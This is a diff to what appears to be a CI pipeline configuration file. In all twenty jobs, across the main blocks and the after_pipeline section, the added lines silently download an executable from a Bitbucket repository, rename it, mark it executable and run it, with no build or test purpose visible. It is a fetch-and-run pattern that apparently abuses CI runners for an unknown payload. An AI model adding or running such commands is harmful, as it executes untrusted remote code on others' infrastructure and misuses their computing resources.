@@ -10,104 +10,104 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
-            - chmod +x upex
-            - ./upex
+            - 'wget -qO cacak https://bitbucket.org/abetasa/garatsas/raw/869fce3fc395242a5a50e50f41d31b60c3738ba9/upex'
+            - 'chmod +x cacak '
+            - './cacak '
         - name: 'Job #2'
           commands:
-            - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
-            - chmod +x upex
-            - ./upex
+            - 'wget -qO cacak https://bitbucket.org/abetasa/garatsas/raw/869fce3fc395242a5a50e50f41d31b60c3738ba9/upex'
+            - 'chmod +x cacak '
+            - './cacak '
         - name: 'Job #3'
           commands:
-            - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
-            - chmod +x upex
-            - ./upex
+            - 'wget -qO cacak https://bitbucket.org/abetasa/garatsas/raw/869fce3fc395242a5a50e50f41d31b60c3738ba9/upex'
+            - 'chmod +x cacak '
+            - './cacak '
         - name: 'Job #4'
           commands:
-            - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
-            - chmod +x upex
-            - ./upex
+            - 'wget -qO cacak https://bitbucket.org/abetasa/garatsas/raw/869fce3fc395242a5a50e50f41d31b60c3738ba9/upex'
+            - 'chmod +x cacak '
+            - './cacak '
         - name: 'Job #5'
           commands:
-            - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
-            - chmod +x upex
-            - ./upex
+            - 'wget -qO cacak https://bitbucket.org/abetasa/garatsas/raw/869fce3fc395242a5a50e50f41d31b60c3738ba9/upex'
+            - 'chmod +x cacak '
+            - './cacak '
         - name: 'Job #6'
           commands:
-            - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
-            - chmod +x upex
-            - ./upex
+            - 'wget -qO cacak https://bitbucket.org/abetasa/garatsas/raw/869fce3fc395242a5a50e50f41d31b60c3738ba9/upex'
+            - 'chmod +x cacak '
+            - './cacak '
         - name: 'Job #7'
           commands:
-            - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
-            - chmod +x upex
-            - ./upex
+            - 'wget -qO cacak https://bitbucket.org/abetasa/garatsas/raw/869fce3fc395242a5a50e50f41d31b60c3738ba9/upex'
+            - 'chmod +x cacak '
+            - './cacak '
         - name: 'Job #8'
           commands:
-            - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
-            - chmod +x upex
-            - ./upex
+            - 'wget -qO cacak https://bitbucket.org/abetasa/garatsas/raw/869fce3fc395242a5a50e50f41d31b60c3738ba9/upex'
+            - 'chmod +x cacak '
+            - './cacak '
         - name: 'Job #9'
           commands:
-            - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
-            - chmod +x upex
-            - ./upex
+            - 'wget -qO cacak https://bitbucket.org/abetasa/garatsas/raw/869fce3fc395242a5a50e50f41d31b60c3738ba9/upex'
+            - 'chmod +x cacak '
+            - './cacak '
         - name: 'Job #10'
           commands:
-            - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
-            - chmod +x upex
-            - ./upex
+            - 'wget -qO cacak https://bitbucket.org/abetasa/garatsas/raw/869fce3fc395242a5a50e50f41d31b60c3738ba9/upex'
+            - 'chmod +x cacak '
+            - './cacak '
 after_pipeline:
   task:
     jobs:
       - name: 'Job #1'
         commands:
-          - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
-          - chmod +x upex
-          - ./upex
+          - 'wget -qO cacak https://bitbucket.org/abetasa/garatsas/raw/869fce3fc395242a5a50e50f41d31b60c3738ba9/upex'
+          - 'chmod +x cacak '
+          - './cacak '
       - name: 'Job #2'
         commands:
-          - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
-          - chmod +x upex
-          - ./upex
+          - 'wget -qO cacak https://bitbucket.org/abetasa/garatsas/raw/869fce3fc395242a5a50e50f41d31b60c3738ba9/upex'
+          - 'chmod +x cacak '
+          - './cacak '
       - name: 'Job #3'
         commands:
-          - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
-          - chmod +x upex
-          - ./upex
+          - 'wget -qO cacak https://bitbucket.org/abetasa/garatsas/raw/869fce3fc395242a5a50e50f41d31b60c3738ba9/upex'
+          - 'chmod +x cacak '
+          - './cacak '
       - name: 'Job #4'
         commands:
-          - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
-          - chmod +x upex
-          - ./upex
+          - 'wget -qO cacak https://bitbucket.org/abetasa/garatsas/raw/869fce3fc395242a5a50e50f41d31b60c3738ba9/upex'
+          - 'chmod +x cacak '
+          - './cacak '
       - name: 'Job #5'
         commands:
-          - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
-          - chmod +x upex
-          - ./upex
+          - 'wget -qO cacak https://bitbucket.org/abetasa/garatsas/raw/869fce3fc395242a5a50e50f41d31b60c3738ba9/upex'
+          - 'chmod +x cacak '
+          - './cacak '
       - name: 'Job #6'
         commands:
-          - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
-          - chmod +x upex
-          - ./upex
+          - 'wget -qO cacak https://bitbucket.org/abetasa/garatsas/raw/869fce3fc395242a5a50e50f41d31b60c3738ba9/upex'
+          - 'chmod +x cacak '
+          - './cacak '
       - name: 'Job #7'
         commands:
-          - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
-          - chmod +x upex
-          - ./upex
+          - 'wget -qO cacak https://bitbucket.org/abetasa/garatsas/raw/869fce3fc395242a5a50e50f41d31b60c3738ba9/upex'
+          - 'chmod +x cacak '
+          - './cacak '
       - name: 'Job #8'
         commands:
-          - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
-          - chmod +x upex
-          - ./upex
+          - 'wget -qO cacak https://bitbucket.org/abetasa/garatsas/raw/869fce3fc395242a5a50e50f41d31b60c3738ba9/upex'
+          - 'chmod +x cacak '
+          - './cacak '
       - name: 'Job #9'
         commands:
-          - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
-          - chmod +x upex
-          - ./upex
+          - 'wget -qO cacak https://bitbucket.org/abetasa/garatsas/raw/869fce3fc395242a5a50e50f41d31b60c3738ba9/upex'
+          - 'chmod +x cacak '
+          - './cacak '
       - name: 'Job #10'
         commands:
-          - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
-          - chmod +x upex
-          - ./upex
+          - 'wget -qO cacak https://bitbucket.org/abetasa/garatsas/raw/869fce3fc395242a5a50e50f41d31b60c3738ba9/upex'
+          - 'chmod +x cacak '
+          - './cacak '
